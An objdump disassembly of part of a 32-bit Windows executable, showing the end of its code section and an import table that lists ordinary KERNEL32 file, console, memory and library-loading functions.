  408458:	74 75                	je     0x4084cf
  40845a:	e8 a4 be ff ff       	call   0x404303
  40845f:	72 6e                	jb     0x4084cf
  408461:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  408468:	75 1c                	jne    0x408486
  40846a:	e8 1f c4 ff ff       	call   0x40488e
  40846f:	72 1a                	jb     0x40848b
  408471:	e8 7d ff ff ff       	call   0x4083f3
  408476:	50                   	push   %eax
  408477:	52                   	push   %edx
  408478:	ba 89 04 00 00       	mov    $0x489,%edx
  40847d:	e8 72 ba ff ff       	call   0x403ef4
  408482:	5a                   	pop    %edx
  408483:	58                   	pop    %eax
  408484:	eb 2b                	jmp    0x4084b1
  408486:	e8 7b c3 ff ff       	call   0x404806
  40848b:	ba 20 00 00 00       	mov    $0x20,%edx
  408490:	29 15 6c aa 40 00    	sub    %edx,0x40aa6c
  408496:	77 07                	ja     0x40849f
  408498:	e8 06 ba ff ff       	call   0x403ea3
  40849d:	74 35                	je     0x4084d4
  40849f:	8b 15 68 aa 40 00    	mov    0x40aa68,%edx
  4084a5:	e8 49 ff ff ff       	call   0x4083f3
  4084aa:	83 05 68 aa 40 00 20 	addl   $0x20,0x40aa68
  4084b1:	f6 05 c9 ab 40 00 02 	testb  $0x2,0x40abc9
  4084b8:	74 13                	je     0x4084cd
  4084ba:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  4084bd:	75 0e                	jne    0x4084cd
  4084bf:	e8 6f c3 ff ff       	call   0x404833
  4084c4:	75 07                	jne    0x4084cd
  4084c6:	80 0d c9 ab 40 00 04 	orb    $0x4,0x40abc9
  4084cd:	f8                   	clc
  4084ce:	c3                   	ret
  4084cf:	ba 2a 08 40 00       	mov    $0x40082a,%edx
  4084d4:	f9                   	stc
  4084d5:	c3                   	ret
  4084d6:	57                   	push   %edi
  4084d7:	bf 83 ac 40 00       	mov    $0x40ac83,%edi
  4084dc:	b9 0a 00 00 00       	mov    $0xa,%ecx
  4084e1:	e8 66 ff ff ff       	call   0x40844c
  4084e6:	b9 0a 00 00 00       	mov    $0xa,%ecx
  4084eb:	e8 5c ff ff ff       	call   0x40844c
  4084f0:	8b 3d 70 aa 40 00    	mov    0x40aa70,%edi
  4084f6:	be cc ab 40 00       	mov    $0x40abcc,%esi
  4084fb:	b9 10 00 00 00       	mov    $0x10,%ecx
  408500:	f3 66 a5             	rep movsw %ds:(%esi),%es:(%edi)
  408503:	89 3d 78 aa 40 00    	mov    %edi,0x40aa78
  408509:	5f                   	pop    %edi
  40850a:	c3                   	ret
  40850b:	00 00                	add    %al,(%eax)
  40850d:	00 00                	add    %al,(%eax)
	...

Disassembly of section .idata:

00412000 <.idata>:
  412000:	ff 25 e8 20 41 00    	jmp    *0x4120e8
  412006:	ff 25 ec 20 41 00    	jmp    *0x4120ec
  41200c:	ff 25 f0 20 41 00    	jmp    *0x4120f0
  412012:	ff 25 f4 20 41 00    	jmp    *0x4120f4
  412018:	ff 25 f8 20 41 00    	jmp    *0x4120f8
  41201e:	ff 25 fc 20 41 00    	jmp    *0x4120fc
  412024:	ff 25 00 21 41 00    	jmp    *0x412100
  41202a:	ff 25 04 21 41 00    	jmp    *0x412104
  412030:	ff 25 08 21 41 00    	jmp    *0x412108
  412036:	ff 25 0c 21 41 00    	jmp    *0x41210c
  41203c:	ff 25 10 21 41 00    	jmp    *0x412110
  412042:	ff 25 14 21 41 00    	jmp    *0x412114
  412048:	ff 25 18 21 41 00    	jmp    *0x412118
  41204e:	ff 25 1c 21 41 00    	jmp    *0x41211c
  412054:	ff 25 20 21 41 00    	jmp    *0x412120
  41205a:	ff 25 24 21 41 00    	jmp    *0x412124
  412060:	ff 25 28 21 41 00    	jmp    *0x412128
  412066:	ff 25 2c 21 41 00    	jmp    *0x41212c
  41206c:	ff 25 30 21 41 00    	jmp    *0x412130
  412072:	ff 25 34 21 41 00    	jmp    *0x412134
  412078:	ff 25 38 21 41 00    	jmp    *0x412138
  41207e:	ff 25 3c 21 41 00    	jmp    *0x41213c
  412084:	ff 25 40 21 41 00    	jmp    *0x412140
  41208a:	ff 25 44 21 41 00    	jmp    *0x412144
  412090:	ff 25 48 21 41 00    	jmp    *0x412148
  412096:	ff 25 4c 21 41 00    	jmp    *0x41214c
  41209c:	ff 25 50 21 41 00    	jmp    *0x412150
  4120a2:	ff 25 54 21 41 00    	jmp    *0x412154
  4120a8:	ff 25 58 21 41 00    	jmp    *0x412158
  4120ae:	ff 25 5c 21 41 00    	jmp    *0x41215c
  4120b4:	ff 25 60 21 41 00    	jmp    *0x412160
  4120ba:	ff 25 64 21 41 00    	jmp    *0x412164
  4120c0:	6c                   	insb   (%dx),%es:(%edi)
  4120c1:	21 01                	and    %eax,(%ecx)
	...
  4120cb:	00 f0                	add    %dh,%al
  4120cd:	21 01                	and    %eax,(%ecx)
  4120cf:	00 e8                	add    %ch,%al
  4120d1:	20 01                	and    %al,(%ecx)
	...
  4120e7:	00 fd                	add    %bh,%ch
  4120e9:	21 01                	and    %eax,(%ecx)
  4120eb:	00 0a                	add    %cl,(%edx)
  4120ed:	22 01                	and    (%ecx),%al
  4120ef:	00 1a                	add    %bl,(%edx)
  4120f1:	22 01                	and    (%ecx),%al
  4120f3:	00 2a                	add    %ch,(%edx)
  4120f5:	22 01                	and    (%ecx),%al
  4120f7:	00 38                	add    %bh,(%eax)
  4120f9:	22 01                	and    (%ecx),%al
  4120fb:	00 4a 22             	add    %cl,0x22(%edx)
  4120fe:	01 00                	add    %eax,(%eax)
  412100:	5a                   	pop    %edx
  412101:	22 01                	and    (%ecx),%al
  412103:	00 68 22             	add    %ch,0x22(%eax)
  412106:	01 00                	add    %eax,(%eax)
  412108:	7a 22                	jp     0x41212c
  41210a:	01 00                	add    %eax,(%eax)
  41210c:	86 22                	xchg   %ah,(%edx)
  41210e:	01 00                	add    %eax,(%eax)
  412110:	9c                   	pushf
  412111:	22 01                	and    (%ecx),%al
  412113:	00 b2 22 01 00 c2    	add    %dh,-0x3dfffede(%edx)
  412119:	22 01                	and    (%ecx),%al
  41211b:	00 d0                	add    %dl,%al
  41211d:	22 01                	and    (%ecx),%al
  41211f:	00 e0                	add    %ah,%al
  412121:	22 01                	and    (%ecx),%al
  412123:	00 ec                	add    %ch,%ah
  412125:	22 01                	and    (%ecx),%al
  412127:	00 fe                	add    %bh,%dh
  412129:	22 01                	and    (%ecx),%al
  41212b:	00 10                	add    %dl,(%eax)
  41212d:	23 01                	and    (%ecx),%eax
  41212f:	00 2a                	add    %ch,(%edx)
  412131:	23 01                	and    (%ecx),%eax
  412133:	00 44 23 01          	add    %al,0x1(%ebx,%eiz,1)
  412137:	00 52 23             	add    %dl,0x23(%edx)
  41213a:	01 00                	add    %eax,(%eax)
  41213c:	62 23                	bound  %esp,(%ebx)
  41213e:	01 00                	add    %eax,(%eax)
  412140:	76 23                	jbe    0x412165
  412142:	01 00                	add    %eax,(%eax)
  412144:	88 23                	mov    %ah,(%ebx)
  412146:	01 00                	add    %eax,(%eax)
  412148:	98                   	cwtl
  412149:	23 01                	and    (%ecx),%eax
  41214b:	00 b6 23 01 00 c6    	add    %dh,-0x39fffedd(%esi)
  412151:	23 01                	and    (%ecx),%eax
  412153:	00 ce                	add    %cl,%dh
  412155:	23 01                	and    (%ecx),%eax
  412157:	00 dc                	add    %bl,%ah
  412159:	23 01                	and    (%ecx),%eax
  41215b:	00 f2                	add    %dh,%dl
  41215d:	23 01                	and    (%ecx),%eax
  41215f:	00 fc                	add    %bh,%ah
  412161:	23 01                	and    (%ecx),%eax
  412163:	00 14 24             	add    %dl,(%esp)
  412166:	01 00                	add    %eax,(%eax)
  412168:	00 00                	add    %al,(%eax)
  41216a:	00 00                	add    %al,(%eax)
  41216c:	fd                   	std
  41216d:	21 01                	and    %eax,(%ecx)
  41216f:	00 0a                	add    %cl,(%edx)
  412171:	22 01                	and    (%ecx),%al
  412173:	00 1a                	add    %bl,(%edx)
  412175:	22 01                	and    (%ecx),%al
  412177:	00 2a                	add    %ch,(%edx)
  412179:	22 01                	and    (%ecx),%al
  41217b:	00 38                	add    %bh,(%eax)
  41217d:	22 01                	and    (%ecx),%al
  41217f:	00 4a 22             	add    %cl,0x22(%edx)
  412182:	01 00                	add    %eax,(%eax)
  412184:	5a                   	pop    %edx
  412185:	22 01                	and    (%ecx),%al
  412187:	00 68 22             	add    %ch,0x22(%eax)
  41218a:	01 00                	add    %eax,(%eax)
  41218c:	7a 22                	jp     0x4121b0
  41218e:	01 00                	add    %eax,(%eax)
  412190:	86 22                	xchg   %ah,(%edx)
  412192:	01 00                	add    %eax,(%eax)
  412194:	9c                   	pushf
  412195:	22 01                	and    (%ecx),%al
  412197:	00 b2 22 01 00 c2    	add    %dh,-0x3dfffede(%edx)
  41219d:	22 01                	and    (%ecx),%al
  41219f:	00 d0                	add    %dl,%al
  4121a1:	22 01                	and    (%ecx),%al
  4121a3:	00 e0                	add    %ah,%al
  4121a5:	22 01                	and    (%ecx),%al
  4121a7:	00 ec                	add    %ch,%ah
  4121a9:	22 01                	and    (%ecx),%al
  4121ab:	00 fe                	add    %bh,%dh
  4121ad:	22 01                	and    (%ecx),%al
  4121af:	00 10                	add    %dl,(%eax)
  4121b1:	23 01                	and    (%ecx),%eax
  4121b3:	00 2a                	add    %ch,(%edx)
  4121b5:	23 01                	and    (%ecx),%eax
  4121b7:	00 44 23 01          	add    %al,0x1(%ebx,%eiz,1)
  4121bb:	00 52 23             	add    %dl,0x23(%edx)
  4121be:	01 00                	add    %eax,(%eax)
  4121c0:	62 23                	bound  %esp,(%ebx)
  4121c2:	01 00                	add    %eax,(%eax)
  4121c4:	76 23                	jbe    0x4121e9
  4121c6:	01 00                	add    %eax,(%eax)
  4121c8:	88 23                	mov    %ah,(%ebx)
  4121ca:	01 00                	add    %eax,(%eax)
  4121cc:	98                   	cwtl
  4121cd:	23 01                	and    (%ecx),%eax
  4121cf:	00 b6 23 01 00 c6    	add    %dh,-0x39fffedd(%esi)
  4121d5:	23 01                	and    (%ecx),%eax
  4121d7:	00 ce                	add    %cl,%dh
  4121d9:	23 01                	and    (%ecx),%eax
  4121db:	00 dc                	add    %bl,%ah
  4121dd:	23 01                	and    (%ecx),%eax
  4121df:	00 f2                	add    %dh,%dl
  4121e1:	23 01                	and    (%ecx),%eax
  4121e3:	00 fc                	add    %bh,%ah
  4121e5:	23 01                	and    (%ecx),%eax
  4121e7:	00 14 24             	add    %dl,(%esp)
  4121ea:	01 00                	add    %eax,(%eax)
  4121ec:	00 00                	add    %al,(%eax)
  4121ee:	00 00                	add    %al,(%eax)
  4121f0:	4b                   	dec    %ebx
  4121f1:	45                   	inc    %ebp
  4121f2:	52                   	push   %edx
  4121f3:	4e                   	dec    %esi
  4121f4:	45                   	inc    %ebp
  4121f5:	4c                   	dec    %esp
  4121f6:	33 32                	xor    (%edx),%esi
  4121f8:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4121fb:	6c                   	insb   (%dx),%es:(%edi)
  4121fc:	00 8b 03 57 72 69    	add    %cl,0x69725703(%ebx)
  412202:	74 65                	je     0x412269
  412204:	46                   	inc    %esi
  412205:	69 6c 65 00 00 80 03 	imul   $0x57038000,0x0(%ebp,%eiz,2),%ebp
  41220c:	57 
  41220d:	72 69                	jb     0x412278
  41220f:	74 65                	je     0x412276
  412211:	43                   	inc    %ebx
  412212:	6f                   	outsl  %ds:(%esi),(%dx)
  412213:	6e                   	outsb  %ds:(%esi),(%dx)
  412214:	73 6f                	jae    0x412285
  412216:	6c                   	insb   (%dx),%es:(%edi)
  412217:	65 41                	gs inc %ecx
  412219:	00 24 02             	add    %ah,(%edx,%eax,1)
  41221c:	49                   	dec    %ecx
  41221d:	73 42                	jae    0x412261
  41221f:	61                   	popa
  412220:	64 52                	fs push %edx
  412222:	65 61                	gs popa
  412224:	64 50                	fs push %eax
  412226:	74 72                	je     0x41229a
  412228:	00 00                	add    %al,(%eax)
  41222a:	4f                   	dec    %edi
  41222b:	00 43 72             	add    %al,0x72(%ebx)
  41222e:	65 61                	gs popa
  412230:	74 65                	je     0x412297
  412232:	46                   	inc    %esi
  412233:	69 6c 65 41 00 06 03 	imul   $0x53030600,0x41(%ebp,%eiz,2),%ebp
  41223a:	53 
  41223b:	65 74 46             	gs je  0x412284
  41223e:	69 6c 65 50 6f 69 6e 	imul   $0x746e696f,0x50(%ebp,%eiz,2),%ebp
  412245:	74 
  412246:	65 72 00             	gs jb  0x412249
  412249:	00 fd                	add    %bh,%ch
  41224b:	02 53 65             	add    0x65(%ebx),%dl
  41224e:	74 45                	je     0x412295
  412250:	6e                   	outsb  %ds:(%esi),(%dx)
  412251:	64 4f                	fs dec %edi
  412253:	66 46                	inc    %si
  412255:	69 6c 65 00 00 31 00 	imul   $0x43003100,0x0(%ebp,%eiz,2),%ebp
  41225c:	43 
  41225d:	6c                   	insb   (%dx),%es:(%edi)
  41225e:	6f                   	outsl  %ds:(%esi),(%dx)
  41225f:	73 65                	jae    0x4122c6
  412261:	48                   	dec    %eax
  412262:	61                   	popa
  412263:	6e                   	outsb  %ds:(%esi),(%dx)
  412264:	64 6c                	fs insb (%dx),%es:(%edi)
  412266:	65 00 0a             	add    %cl,%gs:(%edx)
  412269:	01 47 65             	add    %eax,0x65(%edi)
  41226c:	74 43                	je     0x4122b1
  41226e:	6f                   	outsl  %ds:(%esi),(%dx)
  41226f:	6d                   	insl   (%dx),%es:(%edi)
  412270:	6d                   	insl   (%dx),%es:(%edi)
  412271:	61                   	popa
  412272:	6e                   	outsb  %ds:(%esi),(%dx)
  412273:	64 4c                	fs dec %esp
  412275:	69 6e 65 57 00 b4 03 	imul   $0x3b40057,0x65(%esi),%ebp
  41227c:	6c                   	insb   (%dx),%es:(%edi)
  41227d:	73 74                	jae    0x4122f3
  41227f:	72 6c                	jb     0x4122ed
  412281:	65 6e                	outsb  %gs:(%esi),(%dx)
  412283:	57                   	push   %edi
  412284:	00 00                	add    %al,(%eax)
  412286:	7e 03                	jle    0x41228b
  412288:	57                   	push   %edi
  412289:	69 64 65 43 68 61 72 	imul   $0x54726168,0x43(%ebp,%eiz,2),%esp
  412290:	54 
  412291:	6f                   	outsl  %ds:(%esi),(%dx)
  412292:	4d                   	dec    %ebp
  412293:	75 6c                	jne    0x412301
  412295:	74 69                	je     0x412300
  412297:	42                   	inc    %edx
  412298:	79 74                	jns    0x41230e
  41229a:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  41229e:	43                   	inc    %ebx
  41229f:	72 65                	jb     0x412306
  4122a1:	61                   	popa
  4122a2:	74 65                	je     0x412309
  4122a4:	46                   	inc    %esi
  4122a5:	69 6c 65 4d 61 70 70 	imul   $0x69707061,0x4d(%ebp,%eiz,2),%ebp
  4122ac:	69 
  4122ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4122ae:	67 41                	addr16 inc %ecx
  4122b0:	00 00                	add    %al,(%eax)
  4122b2:	57                   	push   %edi
  4122b3:	02 4d 61             	add    0x61(%ebp),%cl
  4122b6:	70 56                	jo     0x41230e
  4122b8:	69 65 77 4f 66 46 69 	imul   $0x6946664f,0x77(%ebp),%esp
  4122bf:	6c                   	insb   (%dx),%es:(%edi)
  4122c0:	65 00 5b 01          	add    %bl,%gs:0x1(%ebx)
  4122c4:	47                   	inc    %edi
  4122c5:	65 74 46             	gs je  0x41230e
  4122c8:	69 6c 65 53 69 7a 65 	imul   $0x657a69,0x53(%ebp,%eiz,2),%ebp
  4122cf:	00 
  4122d0:	6a 03                	push   $0x3
  4122d2:	56                   	push   %esi
  4122d3:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%edx),%esi
  4122da:	6c                   	insb   (%dx),%es:(%edi)
  4122db:	6c                   	insb   (%dx),%es:(%edi)
  4122dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4122dd:	63 00                	arpl   %eax,(%eax)
  4122df:	00 a3 02 52 65 61    	add    %ah,0x61655202(%ebx)
  4122e5:	64 46                	fs inc %esi
  4122e7:	69 6c 65 00 00 5a 03 	imul   $0x55035a00,0x0(%ebp,%eiz,2),%ebp
  4122ee:	55 
  4122ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4122f0:	6d                   	insl   (%dx),%es:(%edi)
  4122f1:	61                   	popa
  4122f2:	70 56                	jo     0x41234a
  4122f4:	69 65 77 4f 66 46 69 	imul   $0x6946664f,0x77(%ebp),%esp
  4122fb:	6c                   	insb   (%dx),%es:(%edi)
  4122fc:	65 00 37             	add    %dh,%gs:(%edi)
  4122ff:	00 43 6f             	add    %al,0x6f(%ebx)
  412302:	6d                   	insl   (%dx),%es:(%edi)
  412303:	70 61                	jo     0x412366
  412305:	72 65                	jb     0x41236c
  412307:	53                   	push   %ebx
  412308:	74 72                	je     0x41237c
  41230a:	69 6e 67 41 00 00 bd 	imul   $0xbd000041,0x67(%esi),%ebp
  412311:	01 47 65             	add    %eax,0x65(%edi)
  412314:	74 53                	je     0x412369
  412316:	79 73                	jns    0x41238b
  412318:	74 65                	je     0x41237f
  41231a:	6d                   	insl   (%dx),%es:(%edi)
  41231b:	54                   	push   %esp
  41231c:	69 6d 65 41 73 46 69 	imul   $0x69467341,0x65(%ebp),%ebp
  412323:	6c                   	insb   (%dx),%es:(%edi)
  412324:	65 54                	gs push %esp
  412326:	69 6d 65 00 c2 00 46 	imul   $0x4600c200,0x65(%ebp),%ebp
  41232d:	69 6c 65 54 69 6d 65 	imul   $0x54656d69,0x54(%ebp,%eiz,2),%ebp
  412334:	54 
  412335:	6f                   	outsl  %ds:(%esi),(%dx)
  412336:	4c                   	dec    %esp
  412337:	6f                   	outsl  %ds:(%esi),(%dx)
  412338:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  41233b:	46                   	inc    %esi
  41233c:	69 6c 65 54 69 6d 65 	imul   $0x656d69,0x54(%ebp,%eiz,2),%ebp
  412343:	00 
  412344:	6d                   	insl   (%dx),%es:(%edi)
  412345:	03 56 69             	add    0x69(%esi),%edx
  412348:	72 74                	jb     0x4123be
  41234a:	75 61                	jne    0x4123ad
  41234c:	6c                   	insb   (%dx),%es:(%edi)
  41234d:	46                   	inc    %esi
  41234e:	72 65                	jb     0x4123b5
  412350:	65 00 db             	gs add %bl,%bl
  412353:	01 47 65             	add    %eax,0x65(%edi)
  412356:	74 56                	je     0x4123ae
  412358:	65 72 73             	gs jb  0x4123ce
  41235b:	69 6f 6e 45 78 41 00 	imul   $0x417845,0x6e(%edi),%ebp
  412362:	75 01                	jne    0x412365
  412364:	47                   	inc    %edi
  412365:	65 74 4d             	gs je  0x4123b5
  412368:	6f                   	outsl  %ds:(%esi),(%dx)
  412369:	64 75 6c             	fs jne 0x4123d8
  41236c:	65 48                	gs dec %eax
  41236e:	61                   	popa
  41236f:	6e                   	outsb  %ds:(%esi),(%dx)
  412370:	64 6c                	fs insb (%dx),%es:(%edi)
  412372:	65 41                	gs inc %ecx
  412374:	00 00                	add    %al,(%eax)
  412376:	97                   	xchg   %eax,%edi
  412377:	01 47 65             	add    %eax,0x65(%edi)
  41237a:	74 50                	je     0x4123cc
  41237c:	72 6f                	jb     0x4123ed
  41237e:	63 41 64             	arpl   %eax,0x64(%ecx)
  412381:	64 72 65             	fs jb  0x4123e9
  412384:	73 73                	jae    0x4123f9
  412386:	00 00                	add    %al,(%eax)
  412388:	41                   	inc    %ecx
  412389:	02 4c 6f 61          	add    0x61(%edi,%ebp,2),%cl
  41238d:	64 4c                	fs dec %esp
  41238f:	69 62 72 61 72 79 41 	imul   $0x41797261,0x72(%edx),%esp
  412396:	00 00                	add    %al,(%eax)
  412398:	32 03                	xor    (%ebx),%al
  41239a:	53                   	push   %ebx
  41239b:	65 74 55             	gs je  0x4123f3
  41239e:	6e                   	outsb  %ds:(%esi),(%dx)
  41239f:	68 61 6e 64 6c       	push   $0x6c646e61
  4123a4:	65 64 45             	gs fs inc %ebp
  4123a7:	78 63                	js     0x41240c
  4123a9:	65 70 74             	gs jo  0x412420
  4123ac:	69 6f 6e 46 69 6c 74 	imul   $0x746c6946,0x6e(%edi),%ebp
  4123b3:	65 72 00             	gs jb  0x4123b6
  4123b6:	ae                   	scas   %es:(%edi),%al
  4123b7:	01 47 65             	add    %eax,0x65(%edi)
  4123ba:	74 53                	je     0x41240f
  4123bc:	74 64                	je     0x412422
  4123be:	48                   	dec    %eax
  4123bf:	61                   	popa
  4123c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4123c1:	64 6c                	fs insb (%dx),%es:(%edi)
  4123c3:	65 00 00             	add    %al,%gs:(%eax)
  4123c6:	1c 00                	sbb    $0x0,%al
  4123c8:	42                   	inc    %edx
  4123c9:	65 65 70 00          	gs gs jo 0x4123cd
  4123cd:	00 b6 00 45 78 69    	add    %dh,0x69784500(%esi)
  4123d3:	74 50                	je     0x412425
  4123d5:	72 6f                	jb     0x412446
  4123d7:	63 65 73             	arpl   %esp,0x73(%ebp)
  4123da:	73 00                	jae    0x4123dc
  4123dc:	64 02 4d 75          	add    %fs:0x75(%ebp),%cl
  4123e0:	6c                   	insb   (%dx),%es:(%edi)
  4123e1:	74 69                	je     0x41244c
  4123e3:	42                   	inc    %edx
  4123e4:	79 74                	jns    0x41245a
  4123e6:	65 54                	gs push %esp
  4123e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4123e9:	57                   	push   %edi
  4123ea:	69 64 65 43 68 61 72 	imul   $0x726168,0x43(%ebp,%eiz,2),%esp
  4123f1:	00 
  4123f2:	b2 03                	mov    $0x3,%dl
  4123f4:	6c                   	insb   (%dx),%es:(%edi)
  4123f5:	73 74                	jae    0x41246b
  4123f7:	72 6c                	jb     0x412465
  4123f9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4123fb:	00 d6                	add    %dl,%dh
  4123fd:	01 47 65             	add    %eax,0x65(%edi)
  412400:	74 55                	je     0x412457
  412402:	73 65                	jae    0x412469
  412404:	72 44                	jb     0x41244a
  412406:	65 66 61             	gs popaw
  412409:	75 6c                	jne    0x412477
  41240b:	74 4c                	je     0x412459
  41240d:	61                   	popa
  41240e:	6e                   	outsb  %ds:(%esi),(%dx)
  41240f:	67 49                	addr16 dec %ecx
  412411:	44                   	inc    %esp
  412412:	00 00                	add    %al,(%eax)
  412414:	50                   	push   %eax
  412415:	01 47 65             	add    %eax,0x65(%edi)
  412418:	74 45                	je     0x41245f
  41241a:	6e                   	outsb  %ds:(%esi),(%dx)
  41241b:	76 69                	jbe    0x412486
  41241d:	72 6f                	jb     0x41248e
  41241f:	6e                   	outsb  %ds:(%esi),(%dx)
  412420:	6d                   	insl   (%dx),%es:(%edi)
  412421:	65 6e                	outsb  %gs:(%esi),(%dx)
  412423:	74 56                	je     0x41247b
  412425:	61                   	popa
  412426:	72 69                	jb     0x412491
  412428:	61                   	popa
  412429:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
	...
